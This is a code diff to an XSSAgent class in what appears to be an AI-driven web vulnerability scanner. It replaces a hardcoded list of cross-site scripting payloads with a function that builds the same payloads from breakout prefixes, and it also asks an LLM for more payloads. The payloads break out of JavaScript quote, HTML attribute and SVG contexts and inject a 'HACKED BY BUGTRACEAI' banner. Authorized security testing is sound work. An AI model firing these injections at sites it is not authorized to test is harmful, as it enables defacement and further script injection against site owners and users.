@@ -884,20 +884,9 @@ class XSSAgent(BaseAgent, TechContextMixin):
             "INFO"
         )
 
-        # FIRST: Add pre-built visual payloads from GOLDEN_PAYLOADS
-        # These are PROVEN working payloads with specific breakout techniques
-        prebuilt_visual = [
-            # Backslash-quote breakout with backticks (JS contexts with quote escaping)
-            "\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
-            # Single quote breakout
-            "';var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d);//",
-            # Double quote breakout
-            "\";var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d);//",
-            # HTML attribute breakout
-            "\"><div style=\"position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999\">HACKED BY BUGTRACEAI</div><input value=\"",
-            # SVG breakout
-            "\"><svg onload=\"var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)\">",
-        ]
+        # FIRST: Build visual payloads dynamically from breakouts.json
+        # This is cleaner than hardcoding - breakouts can be updated without code changes
+        prebuilt_visual = self._build_visual_payloads_from_breakouts()
 
         # THEN: Ask DeepSeek for additional context-specific visual payloads
         deepseek_payloads = await self._ask_deepseek_visual_payloads(
@@ -915,6 +904,57 @@ class XSSAgent(BaseAgent, TechContextMixin):
                 "SUCCESS"
             )
 
+        return visual_payloads
+
+    def _build_visual_payloads_from_breakouts(self) -> List[str]:
+        """
+        Build visual payloads dynamically from breakouts.json.
+
+        This combines XSS breakout prefixes with visual payload templates
+        to create payloads that inject the HACKED BY BUGTRACEAI banner.
+
+        Returns:
+            List of visual payloads built from breakouts.json prefixes
+        """
+        # Visual payload templates (without breakout prefix)
+        # Template with backticks (for JS contexts where quotes are escaped)
+        JS_VISUAL_BACKTICK = "var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//"
+
+        # Template with single quotes (standard JS)
+        JS_VISUAL_SINGLE = "var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d);//"
+
+        # HTML template (for attribute/tag breakouts)
+        HTML_VISUAL = "<div style=\"position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999\">HACKED BY BUGTRACEAI</div>"
+
+        visual_payloads = []
+
+        # Get XSS breakout prefixes from PayloadAmplifier (uses breakouts.json)
+        if self._payload_amplifier:
+            prefixes = self._payload_amplifier.get_prefixes(category="xss", max_priority=2)
+        else:
+            # Fallback if amplifier not initialized
+            prefixes = ["'", "\"", "\\';", "\\\";", "';", "\";", "'>", "\">"]
+
+        # Build payloads for each prefix
+        for prefix in prefixes[:15]:  # Limit to top 15 prefixes
+            # Determine which template to use based on prefix
+            if prefix.startswith("\\"):
+                # Backslash breakouts work best with backticks
+                visual_payloads.append(f"{prefix}{JS_VISUAL_BACKTICK}")
+            elif prefix.endswith(">"):
+                # Tag breakouts use HTML template
+                visual_payloads.append(f"{prefix}{HTML_VISUAL}<input value=\"")
+            elif prefix in ("'", "';", "'//"):
+                # Single quote breakouts
+                visual_payloads.append(f"{prefix}{JS_VISUAL_SINGLE}")
+            elif prefix in ("\"", "\";", "\"//"):
+                # Double quote breakouts use backticks to avoid escaping issues
+                visual_payloads.append(f"{prefix}{JS_VISUAL_BACKTICK}")
+            else:
+                # Default: try backtick version
+                visual_payloads.append(f"{prefix}{JS_VISUAL_BACKTICK}")
+
+        logger.debug(f"[{self.name}] Built {len(visual_payloads)} visual payloads from breakouts.json")
         return visual_payloads
 
     async def _ask_deepseek_visual_payloads(
